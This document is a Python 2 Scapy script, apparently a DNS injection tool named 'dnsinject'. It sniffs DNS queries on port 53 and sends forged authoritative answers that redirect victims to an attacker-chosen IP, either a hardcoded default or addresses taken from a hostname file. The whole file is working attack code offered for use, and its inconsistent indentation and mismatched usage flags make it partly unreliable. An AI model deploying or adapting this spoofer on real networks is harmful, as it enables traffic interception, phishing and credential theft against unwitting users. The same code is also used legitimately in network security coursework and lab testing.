import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys

def spoof(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS):
    	re_direct= '172.24.30.100'
	ipsrc=pkt[IP].src
    	if expression is None or expression == "":
		print "filter expression is empty" 
   	elif ipsrc in expression:
        	print "victim ip found in bpf filter"
   	if pkt.haslayer(DNSQR): # is DNS question record present
        	# search for victims domain name in file
        	victim = pkt[DNSQR].qname
        	if hnfile is None:
                	print "Using attackers ip in spoofed response"
			print "victim is :",victim
                else:
                	fp=open(hnfile)
                	for line in fp:
                    	   if victim.rstrip('.') in line:
                            	mylist = line.split(" ")
			    	print "victim found in hostname file:",victim
                            	re_direct= mylist[0]
		
            
        	spoofed_pkt = IP(dst=ipsrc, src=pkt[IP].dst)/\
                      	UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      	DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1,qdcount=1,\
                      	an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata=re_direct))
       		send(spoofed_pkt)
        	print 'Sent packet', spoofed_pkt.summary()


if __name__ == '__main__':
    input = sys.argv
    global interface
    hnfile = None
    expression = None
    flag=0	
    try:
        for c in range(0,len(input)-1):
            if '-i' in input[c]:
	   	    interface= sys.argv[c+1]
            	    print "Interface:",interface
            	    flag =1
            if '-h' in input[c]:
                    hnfile = sys.argv[c+1]
            	    print "File:",hnfile
        if len(input)%2 == 0:
	    expression = sys.argv[len(input)-1]
            print "Expression:",expression
        if flag==1:
            sniff(filter='udp port 53', iface=interface, store=0, prn=spoof,count=0)
        else:
	    print "Capture all interfaces"
            sniff(filter='udp port 53', store=0, prn=spoof,count=0)
            

    except AttributeError:
        print "Invalid entry/entries"
	print "Consider a single string in expression"
	print "dnsinject [-i interface] [-f hostnames] expression"
